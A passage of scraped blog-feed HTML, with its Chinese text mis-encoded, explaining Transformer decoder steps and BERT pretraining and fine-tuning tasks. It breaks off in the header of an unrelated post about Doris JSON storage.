<li>1 è¾“å…¥æ•°æ®çš„å½¢å¼ï¼š ç¿»è¯‘çš„æ­£ç¡®"ç­”æ¡ˆ"å’ŒåŒç­‰å¤§å°çš„"ç­”æ¡ˆè´´çº¸"(Mask çŸ©é˜µ)ä¹˜ç§¯ä½œä¸ºè¾“å…¥ï¼Œè¿™æ˜¯ä¸ºäº†ç¡®ä¿ä¸èƒ½æå‰çœ‹åˆ°ç­”æ¡ˆ,ä¸€å¼€å§‹é¢„æµ‹çš„æ—¶å€™åªèƒ½çœ‹åˆ°åˆå§‹ä¿¡æ¯ï¼Œå…¶ä»–çš„éƒ½è¢«æ©ç›–äº†ï¼Œç„¶åé¢„æµ‹å‡ºç¬¬ä¸€ä¸ªä¿¡æ¯åï¼Œé¢„æµ‹ç¬¬äºŒä¸ªä¿¡æ¯æ—¶å€™ï¼Œå°±å·²ç»èƒ½è·å–åˆ°åˆå§‹ä¿¡æ¯+é¢„æµ‹ä¿¡æ¯ 1 äº†ï¼Œæ¥é¢„æµ‹ä¿¡æ¯ 2ï¼Œä»¥æ­¤ç±»æ¨é¢„æµ‹å¾—åˆ°å…¨éƒ¨ç»“æœï¼Œæ³¨æ„ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯åœ¨ä¸€ä¸ªçŸ©é˜µå†…ä¸€æ¬¡ç”Ÿæˆçš„ï¼</li>
<li>2 è°æ¥é¢„æµ‹ï¼Ÿä¸æ˜¯é¢„è®­ç»ƒæ¨¡å‹ï¼Œé¢„è®­ç»ƒæ¨¡å‹å±äºæˆå“æ¨¡å‹ï¼Œæ­¤å¤„æ˜¯æ­å»ºå¥½ Decode æ¡†æ¶(æ¯”å¦‚å‰é¦ˆï¼ŒAdd å’Œå½’ä¸€åŒ–ç­‰å±‚)åï¼Œéšæœºæˆ–è€…è‡ªå®šä¹‰å‚æ•°ï¼Œè¾“å…¥æ•°æ®ç›´æ¥é¢„æµ‹ï¼Œæ ¹æ®ä¸æ–­è®­ç»ƒå¾—åˆ°æœ€ä¼˜å‚æ•°</li>
<li>3 ç¬¬ä¸€ä¸ªå¤šå¤´è¾“å…¥æ•°æ®ï¼š ç¿»è¯‘ç­”æ¡ˆçš„ Embedding ç»“æœ+ä½ç½®ä¿¡æ¯Embedding ç»“æœç”ŸæˆQï¼ŒKï¼ŒV çŸ©é˜µ</li>
<li>4 ç¬¬ä¸€ä¸ªå¤šå¤´ï¼š QK çŸ©é˜µä¹˜ä»¥"ç­”æ¡ˆè´´çº¸"(Mask çŸ©é˜µ)ï¼Œå†ä¹˜ä»¥ Vï¼ŒåŠ æƒæ±‚å’Œï¼Œå†è¿›è¡Œ softwareï¼Œå¤šå¤´ç»“æœæ‹¼æ¥åˆ°ä¸€èµ·å°±æ˜¯æœ€ç»ˆçš„å¤šå¤´ç»“æœ, æ­¤æ—¶å¤šå¤´çš„ä½œç”¨ï¼Œä»…ä»…æ˜¯è·å–äº†åˆæ­¥ç¿»è¯‘ç»“æœè¯è¯­ä¹‹é—´çš„é¡ºåºï¼Œå’Œä¸­æ–‡ç­”æ¡ˆæ²¡æœ‰ä»»ä½•å¯¹åº”å…³ç³»ï¼Œå› ä¸ºè¿˜æ²¡æŸ¥"è¯å…¸"</li>
<li>5 ç¬¬ä¸€ä¸ª Add å’Œ Normï¼š ä¸ encoder é‚£ä¸ªä¸€æ¯›ä¸€æ ·</li>
<li>6 ç¬¬äºŒä¸ªå¤šå¤´è¾“å…¥æ•°æ®ï¼šæ­¤æ—¶ä¸Šé¢5 ä¸­çš„è¾“å…¥ä½œä¸º Q(ç±»ä¼¼äº"æˆ‘è¦æŸ¥å­—å…¸")ï¼Œencodeè¾“å‡ºä½œä¸º Kï¼ŒV(å­—å…¸å†…ç´¢æ€§å’Œè¯¦ç»†ä¿¡æ¯)</li>
<li>7 ç¬¬äºŒä¸ªå¤šå¤´ï¼šåŒæ ·çš„æ–¹æ³•è®¡ç®—å¤šå¤´ç»“æœï¼Œæ­¤æ—¶å·²ç»è·å–åˆ°äº†è¯å…¸ä¿¡æ¯ï¼Œæ­£ç¡®ç‡ä¼šæå‡ä¸å°‘</li>
<li>8 ç¬¬äºŒä¸ªAdd å’Œ Normï¼š ä¸ç¬¬ä¸€ä¸ªå¤„ç†æ–¹æ³•ä¸€æ ·</li>
<li>9 Feed Forwordå¤„ç†æ˜¯ä¸€è‡´çš„</li>
<li>10 ç¬¬ä¸‰ä¸ªAdd å’Œ Normï¼šåŒä¸Š</li>
<li>çº¿æ€§å‡½æ•°ï¼šæŠŠdocodeç”Ÿæˆçš„çŸ©é˜µè½¬åŒ–æˆæ¯ä¸ªè¯è¡¨ä¸­å¯¹åº”çš„"åˆ†æ•°"ï¼Œæ­å»º â€œè¯­ä¹‰ç‰¹å¾â€ åˆ° â€œå…·ä½“è¯æ±‡â€ çš„æ¡¥æ¢ â€”â€” æŠŠæŠ½è±¡çš„è¯­ä¹‰ï¼Œæ˜ å°„åˆ°æ¯ä¸ªå…·ä½“è¯çš„ â€œåŒ¹é…åº¦æ‰“åˆ†"</li>
<li>softmax: åšä¸€ä¸ª â€œå½’ä¸€åŒ–è½¬æ¢â€ï¼Œè®©æ‰€æœ‰åˆ†æ•°å˜æˆ 0~1 ä¹‹é—´çš„æ¦‚ç‡ï¼Œä¸”æ‰€æœ‰è¯çš„æ¦‚ç‡åŠ èµ·æ¥ç­‰äº 1ï¼›</li>
</ul>
</li>
</ul>
<h2 data-id="heading-5">5 bertï¼šåŒå‘ç¼–ç çš„é¢„è®­ç»ƒè¯­è¨€æ¨¡å‹</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e378c9c20fb14c9897374378a2565fd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-u5Lq65LiJ562J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586180&amp;x-signature=so0dO%2FO7yOdrYGfdu8BedOQ8xoU%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60e4c52e2a444f64ba554cc5c131fe75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-u5Lq65LiJ562J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764586180&amp;x-signature=4WpLM35CS%2Bk14b30Guy3lsncMrE%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<ul>
<li>1 é¢„è®­ç»ƒé˜¶æ®µï¼šç”¨å¤§é‡çš„æ— ç›‘ç£æ–‡æœ¬é€šè¿‡è‡ªç›‘ç£(æ— éœ€äººå·¥æ ‡æ³¨)è®­ç»ƒçš„æ–¹å¼( MLP å’Œ NSP)è®­ç»ƒ
<ul>
<li>è¾“å…¥ï¼šä¸ transform ç±»ä¼¼ï¼Œä¹Ÿæ˜¯è¯Embedding+ä½ç½® Embedding å‘é‡å¯¹åº”ç›¸åŠ ä½œä¸ºè¾“å…¥Aï¼Œå¦‚æœæ˜¯å¥å­å¯¹çš„æƒ…å†µè¿˜éœ€è¦åŠ ä¸Šå½’å±æ ‡è®°å‘é‡</li>
<li>ä½†æ˜¯å¥å­å¼€å¤´æœ‰æ ‡è¯†ç¬¦Embeding [CLS]å’Œå¥å­æœ«å°¾çš„[SEP]ä½œä¸ºè¾“å…¥ Bï¼ŒA å’Œ B æ„æˆäº†è¾“å…¥ï¼Œæ³¨æ„ï¼Œæ˜¯æ‹¼æ¥ä¸æ˜¯å¯¹åº”ç›¸åŠ , å…¶ä¸­ä½ç½®å‘é‡ä¸æ˜¯æ­£ä½™å¼¦ä½ç½®äº†ï¼Œå’Œ CLS å’Œ SEP ä¸€æ ·ï¼Œéƒ½æ˜¯ä»åˆå§‹éšæœºå˜é‡éšæœºè®­ç»ƒ"å¯å­¦ä¹ "çš„</li>
<li>transform å› ä¸ºæ˜¯å•å‘çš„æ‰€ä»¥åœ¨è¾“å…¥çš„æ—¶å€™ä½¿ç”¨äº† mask çŸ©é˜µï¼Œè€Œbert æ˜¯ä¸éœ€è¦çš„ï¼Œä½†æ˜¯ä¸¤ä¸ªæ¨¡å‹éƒ½æ˜¯æœ‰"ç­”æ¡ˆ"å¯¹æ¯”çš„ï¼Œä¸ç„¶æ— æ³•åå‘ä¼ æ’­è¿›è¡Œè®­ç»ƒ</li>
</ul>
</li>
<li>MLMï¼šå…ˆä»è¾“å…¥ä¸­éšæœºæŠ½å– 15%ï¼Œå‡†å¤‡è¿›è¡Œå¤„ç†ï¼Œåœ¨è¿™ 15% ä¸­ï¼Œ80% æ¦‚ç‡ç›´æ¥ maskï¼Œ10% æ›¿æ¢å…¶ä»–å•è¯ï¼Œ10% ä¸åŠ¨
<ul>
<li>10% æ¦‚ç‡ç›´æ¥æ›¿æ¢æˆå…¶ä»–å•è¯ï¼Œè¿™æœ‰åŠ©äºæ¨¡å‹å­¦ä¹ ç†è§£ä¸Šä¸‹æ–‡çš„é‡è¦æ€§ï¼Œè€Œä¸ä»…ä»…æ˜¯ä¾èµ–äº[MASK]æ ‡è®°</li>
<li>10% æ¦‚ç‡åŸå°ä¸åŠ¨ï¼› è¿™æœ‰åŠ©äºæ¨¡å‹åœ¨å¾®è°ƒé˜¶æ®µæ›´å¥½åœ°å¤„ç†æœªé®è”½çš„å•è¯</li>
</ul>
</li>
<li>NSPï¼šè¯­æ–™åº“ä¸­éšæœºæŠ½å–ä¸¤ä¸ªå¥å­ï¼Œåˆ¤æ–­æ˜¯ä¸æ˜¯ä¸Šä¸‹æ–‡;
<ul>
<li>åœ¨BERTçš„åç»­ç‰ˆæœ¬ä¸­ï¼ŒNext Sentence Predictionï¼ˆNSPï¼‰ä»»åŠ¡è¢«åºŸå¼ƒäº†ã€‚å› ä¸ºç ”ç©¶äººå‘˜å‘ç°è¿™ä¸ªä»»åŠ¡å¯¹ä¸‹æ¸¸ä»»åŠ¡çš„æ€§èƒ½æå‡æœ‰é™</li>
<li>ä¸¾ä¾‹ï¼š</li>
</ul>
<pre><code class="hljs language-python" lang="python">æ¯ä¸ªtokençš„è¾“å…¥ = è‡ªèº«å‘é‡ï¼ˆå¯å­¦ä¹ ï¼‰ + ä½ç½®å‘é‡ï¼ˆå¯å­¦ä¹ ï¼‰ + å¥å­å½’å±å‘é‡ï¼ˆå›ºå®š<span class="hljs-number">0</span>/<span class="hljs-number">1</span>ï¼‰
	[CLS]  â†’  è‡ªèº«å‘é‡ï¼ˆåˆå§‹éšæœºï¼š[<span class="hljs-number">0.2</span>, -<span class="hljs-number">0.1</span>, <span class="hljs-number">0.3</span>]ï¼‰ 
			+ ä½ç½®å‘é‡ï¼ˆç¬¬<span class="hljs-number">1</span>ä½ï¼š[<span class="hljs-number">0.5</span>, <span class="hljs-number">0.02</span>, -<span class="hljs-number">0.1</span>]ï¼‰ 
			+ å¥å­å½’å±å‘é‡ï¼ˆå¥<span class="hljs-number">1</span>ï¼š[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]ï¼‰ 
			= æœ€ç»ˆè¾“å…¥å‘é‡ï¼š[<span class="hljs-number">0.7</span>, -<span class="hljs-number">0.08</span>, <span class="hljs-number">0.2</span>]  ğŸ‘‰  ä¸æ˜¯å›ºå®šå€¼ï¼Œè®­ç»ƒä¸­ä¼šå˜
	
	<span class="hljs-string">"æˆ‘"</span>   â†’  è‡ªèº«å‘é‡ï¼ˆåˆå§‹éšæœºï¼š[<span class="hljs-number">0.8</span>, <span class="hljs-number">0.4</span>, -<span class="hljs-number">0.2</span>]ï¼‰ 
			+ ä½ç½®å‘é‡ï¼ˆç¬¬<span class="hljs-number">2</span>ä½ï¼š[<span class="hljs-number">0.4</span>, <span class="hljs-number">0.05</span>, -<span class="hljs-number">0.05</span>]ï¼‰ 
			+ å¥å­å½’å±å‘é‡ï¼ˆå¥<span class="hljs-number">1</span>ï¼š[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]ï¼‰ 
			= æœ€ç»ˆè¾“å…¥å‘é‡ï¼š[<span class="hljs-number">1.2</span>, <span class="hljs-number">0.45</span>, -<span class="hljs-number">0.25</span>]
	
	...ï¼ˆä¸­é—´<span class="hljs-string">"çˆ±"</span><span class="hljs-string">"åƒ"</span><span class="hljs-string">"è‹¹æœ"</span>åŒç†ï¼Œéƒ½æ˜¯å„è‡ªå‘é‡ç›¸åŠ ï¼Œå½’å±å‘é‡å…¨ä¸º<span class="hljs-number">0</span>ï¼‰...
	
	[SEP]  â†’  è‡ªèº«å‘é‡ï¼ˆåˆå§‹éšæœºï¼š[-<span class="hljs-number">0.3</span>, <span class="hljs-number">0.6</span>, <span class="hljs-number">0.2</span>]ï¼‰ 
			+ ä½ç½®å‘é‡ï¼ˆç¬¬<span class="hljs-number">6</span>ä½ï¼š[<span class="hljs-number">0.1</span>, <span class="hljs-number">0.01</span>, -<span class="hljs-number">0.15</span>]ï¼‰ 
			+ å¥å­å½’å±å‘é‡ï¼ˆå¥<span class="hljs-number">1</span>ï¼š[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]ï¼‰ 
			= æœ€ç»ˆè¾“å…¥å‘é‡ï¼š[-<span class="hljs-number">0.2</span>, <span class="hljs-number">0.61</span>, <span class="hljs-number">0.05</span>]
	
	<span class="hljs-string">"å®ƒ"</span>   â†’  è‡ªèº«å‘é‡ï¼ˆåˆå§‹éšæœºï¼š[<span class="hljs-number">0.1</span>, -<span class="hljs-number">0.3</span>, <span class="hljs-number">0.7</span>]ï¼‰ 
			+ ä½ç½®å‘é‡ï¼ˆç¬¬<span class="hljs-number">7</span>ä½ï¼š[<span class="hljs-number">0.08</span>, <span class="hljs-number">0.005</span>, -<span class="hljs-number">0.18</span>]ï¼‰ 
			+ å¥å­å½’å±å‘é‡ï¼ˆå¥<span class="hljs-number">2</span>ï¼š[<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]ï¼‰  ğŸ‘‰  å¥<span class="hljs-number">2</span>ä¸“å±æ ‡è®°ï¼Œå’Œå¥<span class="hljs-number">1</span>åŒºåˆ†
			= æœ€ç»ˆè¾“å…¥å‘é‡ï¼š[<span class="hljs-number">1.18</span>, -<span class="hljs-number">0.295</span>, <span class="hljs-number">0.52</span>]
	
	...ï¼ˆä¸­é—´<span class="hljs-string">"å¾ˆ"</span><span class="hljs-string">"ç”œ"</span>åŒç†ï¼Œå½’å±å‘é‡å…¨ä¸º<span class="hljs-number">1</span>ï¼‰...
	
	[SEP]  â†’  è‡ªèº«å‘é‡ï¼ˆåˆå§‹éšæœºï¼š[-<span class="hljs-number">0.3</span>, <span class="hljs-number">0.6</span>, <span class="hljs-number">0.2</span>]ï¼‰ 
			+ ä½ç½®å‘é‡ï¼ˆç¬¬<span class="hljs-number">10</span>ä½ï¼š[<span class="hljs-number">0.02</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">0.2</span>]ï¼‰ 
			+ å¥å­å½’å±å‘é‡ï¼ˆå¥<span class="hljs-number">2</span>ï¼š[<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]ï¼‰ 
			= æœ€ç»ˆè¾“å…¥å‘é‡ï¼š[<span class="hljs-number">0.72</span>, <span class="hljs-number">1.6</span>, <span class="hljs-number">1.0</span>]
</code></pre>
</li>
<li>2 å¾®è°ƒé˜¶æ®µï¼šBERTé¦–å…ˆä½¿ç”¨é¢„è®­ç»ƒçš„å‚æ•°åˆå§‹åŒ–æ¨¡å‹ï¼Œæ‰€æœ‰å‚æ•°éƒ½ä½¿ç”¨ä¸‹æ¸¸ä»»åŠ¡çš„æ ‡ç­¾æ•°æ®è¿›è¡Œå¾®è°ƒï¼Œæ¯ä¸ªä¸åŒçš„ä¸‹æ¸¸ä»»åŠ¡éƒ½æœ‰å•ç‹¬çš„å¾®è°ƒæ¨¡å‹
<ul>
<li>bert çš„ä¸»å¹²å°±æ˜¯å¤šä¸ª transform çš„ encode å åŠ ï¼Œä¸ºäº†æ·±å…¥ç†è§£è¯­ä¹‰ï¼Œä½†æ˜¯å…·ä½“ä»»åŠ¡ä½¿ç”¨è¿˜æ˜¯éœ€è¦åœ¨è¾“å‡ºå±‚(ä¸»å¹²éƒ¨åˆ†å¾®è°ƒ)è¿›è¡Œå¾®è°ƒå¤„ç†</li>
<li>å¾®è°ƒä»»åŠ¡åŒ…å«ï¼š
<ul>
<li>åŸºäºå¥å­å¯¹çš„åˆ†ç±»ä»»åŠ¡ï¼šæ ¸å¿ƒå…±æ€§ï¼šè¾“å…¥æ˜¯ â€œå¥ 1 + å¥ 2â€ï¼Œç”¨ [CLS] æ±‡æ€»å…¨å±€è¯­ä¹‰ï¼Œè¾“å‡ºå±‚åšåˆ†ç±» / å›å½’ï¼Œå¤ç”¨å¥å¯¹å½’å±æ ‡è®°ï¼ˆ0/1ï¼‰
<ul>
<li>MNLIï¼šè‡ªç„¶è¯­è¨€æ¨ç†)  è¾“å‡ºå±‚ï¼šçº¿æ€§å±‚ + Softmaxï¼ˆä¸‰åˆ†ç±»ï¼šè•´å« / çŸ›ç›¾ / ä¸­ç«‹ï¼‰ï¼›ç›®çš„ï¼šåˆ¤æ–­å¥ 2 æ˜¯å¦èƒ½ä»å¥ 1 æ¨å‡ºã€‚</li>
<li>QQPï¼ˆQuora é—®ç­”åŒ¹é…ï¼‰ï¼šè¾“å‡ºå±‚ï¼šçº¿æ€§å±‚ + Softmaxï¼ˆäºŒåˆ†ç±»ï¼šä¸¤é—®é¢˜æ˜¯å¦è¯­ä¹‰ç›¸åŒï¼‰ï¼›ç›®çš„ï¼šåˆ¤æ–­ä¸¤ä¸ªé—®é¢˜æ˜¯å¦æ˜¯åŒä¸€é—®é¢˜çš„ä¸åŒè¡¨è¿°ã€‚</li>
<li>QNLIï¼ˆé—®ç­”è‡ªç„¶è¯­è¨€æ¨ç†ï¼‰è¾“å‡ºå±‚ï¼šçº¿æ€§å±‚ + Softmaxï¼ˆäºŒåˆ†ç±»ï¼šæ®µè½å¥å­æ˜¯å¦èƒ½å›ç­”é—®é¢˜ï¼‰ï¼›ç›®çš„ï¼šç­›é€‰èƒ½å›ç­”é—®é¢˜çš„å¥å­ã€‚</li>
<li>STS-Bï¼ˆè¯­ä¹‰æ–‡æœ¬ç›¸ä¼¼åº¦ï¼‰ï¼šè¾“å‡ºå±‚ï¼šçº¿æ€§å±‚ï¼ˆå›å½’ä»»åŠ¡ï¼Œè¾“å‡º 0~5 çš„ç›¸ä¼¼åº¦åˆ†æ•°ï¼‰ï¼›ç›®çš„ï¼šé‡åŒ–ä¸¤å¥è¯çš„è¯­ä¹‰ç›¸ä¼¼ç¨‹åº¦ã€‚</li>
<li>MRPCï¼ˆå¾®è½¯åŒä¹‰å¥åŒ¹é…ï¼‰ï¼šè¾“å‡ºå±‚ï¼šçº¿æ€§å±‚ + Softmaxï¼ˆäºŒåˆ†ç±»ï¼šæ˜¯å¦åŒä¹‰ï¼‰ï¼›ç›®çš„ï¼šåˆ¤æ–­ä¸¤å¥è¯æ˜¯å¦è¯­ä¹‰ç­‰ä»·ã€‚</li>
<li>RTEï¼ˆæ–‡æœ¬è•´å«è¯†åˆ«ï¼‰ï¼šè¾“å‡ºå±‚ï¼šçº¿æ€§å±‚ + Softmaxï¼ˆäºŒåˆ†ç±»ï¼šè•´å« / ä¸è•´å«ï¼‰ï¼›ç›®çš„ï¼šç®€åŒ–ç‰ˆ MNLIï¼Œåªåˆ¤æ–­æ˜¯å¦è•´å«ã€‚</li>
<li>SWAGï¼ˆæƒ…å¢ƒæ¨ç†ï¼‰è¾“å‡ºå±‚ï¼šçº¿æ€§å±‚ + Softmaxï¼ˆå››åˆ†ç±»ï¼šä» 4 ä¸ªå€™é€‰ååŠå¥é€‰æœ€è¿è´¯çš„ï¼‰ï¼›ç›®çš„ï¼šåˆ¤æ–­å“ªä¸ªå€™é€‰å¥èƒ½æ‰¿æ¥å‰åŠå¥çš„æƒ…å¢ƒã€‚</li>
</ul>
</li>
<li>åŸºäºå•ä¸ªå¥å­çš„åˆ†ç±»ä»»åŠ¡ï¼šæ ¸å¿ƒå…±æ€§ï¼šè¾“å…¥æ˜¯å•å¥ï¼Œä¸ç”¨å¥å¯¹æ ‡è®°ï¼ˆå…¨æ ‡ 0ï¼‰ï¼Œ[CLS] æ±‡æ€»è¯­ä¹‰ï¼Œè¾“å‡ºå±‚åˆ†ç±»ã€‚
<ul>
<li>SST-2ï¼ˆæƒ…æ„Ÿåˆ†ç±»ï¼‰ï¼šè¾“å‡ºå±‚ï¼šçº¿æ€§å±‚ + Softmaxï¼ˆäºŒåˆ†ç±»ï¼šæ­£é¢ / è´Ÿé¢ï¼‰ï¼›ç›®çš„ï¼šåˆ¤æ–­å¥å­æƒ…æ„Ÿå€¾å‘ã€‚</li>
<li>ColAï¼ˆè¯­è¨€å¯æ¥å—æ€§åˆ¤æ–­ï¼‰ï¼šè¾“å‡ºå±‚ï¼šçº¿æ€§å±‚ + Softmaxï¼ˆäºŒåˆ†ç±»ï¼šå¥å­æ˜¯å¦è¯­æ³• / è¯­ä¹‰é€šé¡ºï¼‰ï¼›ç›®çš„ï¼šåˆ¤æ–­å¥å­æ˜¯å¦æ˜¯è‡ªç„¶è¯­è¨€ï¼ˆæ¯”å¦‚ â€œæˆ‘åƒé¥­â€ å¯æ¥å—ï¼Œâ€œé¥­åƒæˆ‘â€ ä¸å¯æ¥å—ï¼‰ã€‚</li>
</ul>
</li>
<li>é—®ç­”ä»»åŠ¡ï¼šæ ¸å¿ƒï¼šè¾“å…¥æ˜¯ â€œé—®é¢˜ + åŸæ–‡æ®µè½â€ï¼Œè¾“å‡ºå±‚é¢„æµ‹ç­”æ¡ˆçš„ â€œèµ·å§‹ / ç»“æŸä½ç½®â€ï¼Œä¸åšåˆ†ç±»åšå®šä½ã€‚
<ul>
<li>SQuADï¼šè¾“å‡ºå±‚ï¼šä¸¤ä¸ªç‹¬ç«‹çº¿æ€§å±‚ï¼ˆä¸€ä¸ªé¢„æµ‹ç­”æ¡ˆèµ·å§‹ä½ç½®ï¼Œä¸€ä¸ªé¢„æµ‹ç»“æŸä½ç½®ï¼‰ï¼›
<ul>
<li>ç›®çš„ï¼šä»åŸæ–‡ä¸­æ‰¾åˆ°é—®é¢˜çš„ç­”æ¡ˆç‰‡æ®µï¼ˆæ¯”å¦‚é—®é¢˜ â€œæç™½ç”Ÿäºå“ªå¹´ï¼Ÿâ€ï¼ŒåŸæ–‡ â€œæç™½ç”Ÿäº 701 å¹´â€ï¼Œé¢„æµ‹èµ·å§‹ = 3ï¼Œç»“æŸ = 5ï¼‰ã€‚</li>
</ul>
</li>
</ul>
</li>
<li>å‘½åå®ä½“è¯†åˆ«NERï¼šæ ¸å¿ƒï¼šè¾“å…¥æ˜¯å•å¥ï¼Œè¾“å‡ºå±‚å¯¹ â€œæ¯ä¸ªè¯â€ åšåˆ†ç±»ï¼ˆä¸æ˜¯ [CLS] æ±‡æ€»ï¼‰ï¼Œè¯†åˆ«å®ä½“ç±»å‹ã€‚
<ul>
<li>CoNLL-2003 NERï¼šè¾“å‡ºå±‚ï¼šç»™æ¯ä¸ª token é…ä¸€ä¸ªçº¿æ€§å±‚ + Softmaxï¼ˆå¤šåˆ†ç±»ï¼šPER äºº / ORG æœºæ„ / LOC åœ°ç‚¹ / O éå®ä½“ï¼‰ï¼›
<ul>
<li>ç›®çš„ï¼šç»™æ¯ä¸ªè¯æ‰“å®ä½“æ ‡ç­¾ï¼ˆæ¯”å¦‚ â€œæç™½ï¼ˆPERï¼‰ç”Ÿäº 701 å¹´ï¼Œæ˜¯å”ä»£ï¼ˆORGï¼‰è¯—äººâ€ï¼‰ã€‚</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥ç†è§£ Doris Variantï¼šå¦‚ä½•è®© JSON æŸ¥è¯¢æ€§èƒ½è¿½å¹³åˆ—å­˜ï¼Œè¿˜èƒ½æ‰¿è½½ä¸‡åˆ—ç´¢å¼•å­—æ®µï¼Ÿï½œDeep Dive]]></title>    <link>https://juejin.cn/post/7576086446459895843</link>    <guid>https://juejin.cn/post/7576086446459895843</guid>    <pubDate>2025-11-24T10:49:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576086446459895843" data-draft-id="7575897635137552384" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥ç†è§£ Doris Variantï¼šå¦‚ä½•è®© JSON æŸ¥è¯¢æ€§èƒ½è¿½å¹³åˆ—å­˜ï¼Œè¿˜èƒ½æ‰¿è½½ä¸‡åˆ—ç´¢å¼•å­—æ®µï¼Ÿï½œDeep Dive"/> <meta itemprop="keywords" content="æ•°æ®åº“,å¤§æ•°æ®,æ•°æ®åˆ†æ"/> <meta itemprop="datePublished" content="2025-11-24T10:49:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SelectDB"/> <meta itemprop="url" content="https://juejin.cn/user/3189021726222904"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥ç†è§£ Doris Variantï¼šå¦‚ä½•è®© JSON æŸ¥è¯¢æ€§èƒ½è¿½å¹³åˆ—å­˜ï¼Œè¿˜èƒ½æ‰¿è½½ä¸‡åˆ—ç´¢å¼•å­—æ®µï¼Ÿï½œDeep Dive
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3189021726222904/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SelectDB
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T10:49:40.000Z" title="Mon Nov 24 2025 10:49:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body 